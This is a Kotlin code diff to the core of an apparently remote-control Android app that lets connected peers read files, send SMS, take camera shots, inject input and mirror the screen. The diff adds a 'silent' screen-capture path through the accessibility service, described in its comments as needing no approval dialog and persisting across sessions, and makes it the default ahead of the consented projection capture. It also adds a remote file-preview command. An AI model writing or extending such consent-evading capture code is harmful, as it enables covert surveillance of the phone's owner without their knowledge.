@@ -45,6 +45,7 @@ class DeviceCore(
     private val context: Context,
     private val prefs: Prefs,
     private val screen: ScreenCapture,
+    private val silent: SilentMirror,
     private val camera: CameraController,
     private val scope: CoroutineScope,
 ) {
@@ -86,7 +87,7 @@ class DeviceCore(
                 peer.state.upload = null
             }
         }
-        if (peers.none { it.state.mirroring }) screen.stop()
+        if (peers.none { it.state.mirroring }) stopCapture()
     }
 
     fun clientCount(): Int = peers.count { it.state.authed }
@@ -97,9 +98,10 @@ class DeviceCore(
             .put("name", prefs.deviceName)
             .put("model", Build.MODEL)
             .put("android", Build.VERSION.RELEASE)
-            .put("agent", "airlock-android/1.0.2")
+            .put("agent", "airlock-android/1.0.3")
             .put("ip", DeviceStats.lanIp() ?: JSONObject.NULL)
             .put("port", DeviceService.LAN_PORT)
+            .put("silentCapture", silent.isAvailable)
         return Protocol.envelope("hello", JSONObject()
             .put("device", device)
             .put("capabilities", Protocol.capabilities)
@@ -117,6 +119,7 @@ class DeviceCore(
         .put("smsSend", granted(Manifest.permission.SEND_SMS))
         .put("notifications", notificationAccessEnabled())
         .put("accessibility", KeyAccessibilityService.isEnabled(context))
+        .put("screenshot", silent.isAvailable)
         .put("allFiles", Build.VERSION.SDK_INT < 30 || Environment.isExternalStorageManager())
         .put("battery", power?.isIgnoringBatteryOptimizations(context.packageName) ?: false)
 
@@ -199,8 +202,31 @@ class DeviceCore(
         val data = req.optJSONObject("data") ?: JSONObject()
         val started = System.currentTimeMillis()
         try {
+            if (type == "fs.preview") {
+                val path = data.optString("path")
+                val bytes = runWithWatchdog(PREVIEW_TIMEOUT_MS) { fs.preview(path) }
+                // Same reply-first rule as camera.shot: settle the request before
+                // the (small) JPEG touches the socket.
+                peer.sendText(
+                    Protocol.response(
+                        req,
+                        JSONObject()
+                            .put("path", path)
+                            .put("bytes", bytes.size)
+                            .put("ts", System.currentTimeMillis()),
+                    ).toString()
+                )
+                peer.sendBinary(
+                    Protocol.encodeFrame(Protocol.Kind.PREVIEW, Protocol.Codec.JPEG, payload = bytes)
+                )
+                log("info", "preview $path · ${bytes.size} B")
+                return
+            }
+
             if (type == "camera.shot") {
-                val shot = cameraShot(data)
+                // The watchdog matters here too: a driver stuck in a binder call
+                // used to leave the dashboard spinner running forever.
+                val shot = runWithWatchdog(CAMERA_TIMEOUT_MS + 2_000L) { cameraShot(data) }
                 // Reply first: a tiny JSON envelope must never queue behind a
                 // multi-hundred-KB JPEG on a slow mobile uplink.
                 peer.sendText(
@@ -324,6 +350,7 @@ class DeviceCore(
         "fs.upload.begin" -> beginUpload(peer, d)
         "fs.upload.done" -> finishUpload(peer, d)
         "fs.download" -> download(peer, d)
+        "fs.preview" -> throw IllegalStateException("preview handled by the reply-first path")
         "mirror.start" -> startMirror(peer, d)
         "mirror.stop" -> stopMirrorFor(peer)
         "input.tap" -> tap(d)
@@ -405,6 +432,7 @@ class DeviceCore(
                 upload.tmp.delete()
             }
             log("info", "upload ok · ${fs.wirePath(upload.target)} · ${upload.target.length()} B")
+            fs.invalidate()
             return JSONObject()
                 .put("path", fs.wirePath(upload.target))
                 .put("size", upload.target.length())
@@ -441,25 +469,41 @@ class DeviceCore(
 
     // ---------------------------------------------------------------- mirror
     private fun startMirror(peer: Peer, d: JSONObject): JSONObject {
-        if (!screen.isReady) {
-            throw IllegalStateException("screen capture not approved — open Airlock on the phone and tap Allow capture")
-        }
         val fps = d.optInt("fps", 8)
         val quality = d.optInt("quality", 65)
         val maxWidth = d.optInt("maxWidth", 720)
-        val started = screen.start(fps, quality, maxWidth) { jpeg, _, _ ->
-            val frame = Protocol.encodeFrame(Protocol.Kind.MIRROR, Protocol.Codec.JPEG, payload = jpeg)
-            for (p in peers) {
-                if (!p.state.authed || !p.state.mirroring) continue
-                // Shed mirror frames on a congested uplink; stale frames are
-                // worthless and must never block command replies.
-                if (p.backlog > MIRROR_BACKLOG_LIMIT) continue
-                p.sendBinary(frame)
+
+        // Silent path first: once accessibility is enabled this needs no
+        // approval dialog and keeps working for every later session.
+        if (silent.isAvailable) {
+            val started = silent.start(fps, quality, maxWidth, { jpeg, _, _ -> broadcastMirror(jpeg) }) { reason ->
+                log("warn", "silent mirror stopped: $reason")
+                for (p in peers) p.state.mirroring = false
+            }
+            if (started) {
+                peer.state.mirroring = true
+                log("info", "silent mirror started at ${silent.fps} fps (accessibility)")
+                return JSONObject()
+                    .put("fps", silent.fps)
+                    .put("quality", quality)
+                    .put("maxWidth", maxWidth)
+                    .put("control", KeyAccessibilityService.isEnabled(context))
+                    .put("silent", true)
+                    .put("capture", "accessibility")
             }
         }
+
+        if (!screen.isReady) {
+            throw IllegalStateException(
+                "silent capture needs the Airlock accessibility service — enable it on the phone " +
+                    "once (no approval dialog). Without it, open Airlock and tap Allow capture for a " +
+                    "projection session.",
+            )
+        }
+        val started = screen.start(fps, quality, maxWidth) { jpeg, _, _ -> broadcastMirror(jpeg) }
         if (!started) throw IllegalStateException("could not start capture")
         peer.state.mirroring = true
-        log("info", "mirror started at $fps fps")
+        log("info", "mirror started at $fps fps (projection)")
         val control = KeyAccessibilityService.isEnabled(context)
         if (!control) {
             log("warn", "mirror is view-only: accessibility service is off")
@@ -470,13 +514,32 @@ class DeviceCore(
             .put("maxWidth", maxWidth)
             .put("control", control)
             .put("silent", prefs.silent)
+            .put("capture", "projection")
+    }
+
+    private fun broadcastMirror(jpeg: ByteArray) {
+        val frame = Protocol.encodeFrame(Protocol.Kind.MIRROR, Protocol.Codec.JPEG, payload = jpeg)
+        for (p in peers) {
+            if (!p.state.authed || !p.state.mirroring) continue
+            // Shed mirror frames on a congested uplink; stale frames are
+            // worthless and must never block command replies.
+            if (p.backlog > MIRROR_BACKLOG_LIMIT) continue
+            p.sendBinary(frame)
+        }
     }
 
     private fun stopMirrorFor(peer: Peer): JSONObject {
         peer.state.mirroring = false
-        if (peers.none { it.state.mirroring }) screen.stop()
+        if (peers.none { it.state.mirroring }) stopCapture()
         return JSONObject().put("ok", true)
     }
+
+    private fun stopCapture() {
+        silent.stop()
+        screen.stop()
+    }
+
+    fun captureRunning(): Boolean = silent.isRunning || screen.isRunning
 
     // ---------------------------------------------------------------- input
     private fun metrics(): Pair<Int, Int> {
@@ -738,6 +801,7 @@ class DeviceCore(
         private const val HANDLER_TIMEOUT_MS = 25_000L
         private const val CAMERA_TIMEOUT_MS = 20_000L
         private const val DOWNLOAD_TIMEOUT_MS = 15 * 60_000L
+        private const val PREVIEW_TIMEOUT_MS = 20_000L
 
         /** Log slow handlers so link congestion is visible in the dashboard. */
         private const val SLOW_COMMAND_MS = 2_000L
